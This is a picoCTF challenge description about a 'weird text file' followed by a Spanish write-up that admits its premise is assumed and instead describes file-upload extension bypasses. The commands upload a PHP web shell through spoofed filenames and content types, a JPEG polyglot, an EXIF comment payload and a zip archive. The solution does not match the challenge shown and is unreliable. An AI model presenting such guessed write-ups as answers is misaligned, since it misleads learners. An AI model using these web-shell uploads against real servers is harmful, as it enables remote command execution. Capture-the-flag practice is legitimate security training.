#### Description

This is a really weird text file [TXT](https://jupiter.challenges.picoctf.org/static/e7e5d188621ee705ceeb0452525412ef/flag.txt)? Can you find the flag?
### 🧩 Reto: extensions

**Descripción:**  
(Asumido) Reto sobre extensiones de archivo / bypass por extensiones: la aplicación restringe uploads por extensión, o debes identificar archivos con extensiones engañosas (double extension, content-type mismatch, polyglots). Recuperar la flag explotando esa validación.

---

### **Solución** _(relajada y directa — técnicas rápidas)_

1. Recon: ver cómo valida la extensión (respuesta del servidor / código cliente):
    

`# subir una imagen normal y analizar respuesta curl -i -F "file=@id.jpg" https://HOST/upload # subir con filename forzado curl -i -F "file=@id.jpg;filename=shell.php" https://HOST/upload`

2. Pruebas de bypass comunes:
    

- **Doble extensión:** `shell.php.jpg`, `file.jpg.php`
    
- **Filename spoofing en multipart:** `-F "file=@img.jpg;filename=shell.php;type=image/jpeg"`
    
- **Content-Type falsificado:** `-H "Content-Type: image/jpeg"` al subir un PHP real
    
- **Polyglot (imagen + payload appended):**
    

`# append PHP after EOF de JPG cp img.jpg exploit.jpg printf '<?php system($_GET["c"]); ?>' >> exploit.jpg curl -i -F "file=@exploit.jpg;filename=shell.php;type=image/jpeg" https://HOST/upload`

3. Si el servidor renombra por hash pero conserva extensión, intenta `shell.jpg` con payload y prueba acceder a `/uploads/<hash>.php` y `/uploads/<hash>.jpg` (ambas rutas).
    
4. Si el server re-encodea imágenes (GD/ImageMagick), appended payload suele eliminarse → prueba EXIF payload:
    

`exiftool -Comment='<?php system($_GET["c"]); ?>' img.jpg curl -i -F "file=@img.jpg;filename=shell.php;type=image/jpeg" https://HOST/upload`

5. Si la app valida MIME con `finfo`, intenta construir headers y polyglots; si valida con `getimagesize()` muchas veces cabezas JPEG mínimas bastan.
    

---

### **Notas adicionales**

- Suele funcionar: `filename=shell.php` en el multipart (si el servidor confía en esa parte).
    
- Si el servidor re-encodea, busca otros endpoints (preview, tmp) que no re-encodeen.
    
- Revisa si la app acepta `.zip` y extrae su contenido → subir zip con `shell.php` dentro puede explotar.
    
- Usa Burp para inspeccionar el multipart exacto y probar variantes sin volver a subir el archivo desde disco.
    

---

### **Referencias**

- PayloadsAllTheThings — File upload bypass.
    
- `exiftool`, Burp Repeater (multipart editing), `zip`/`unzip`.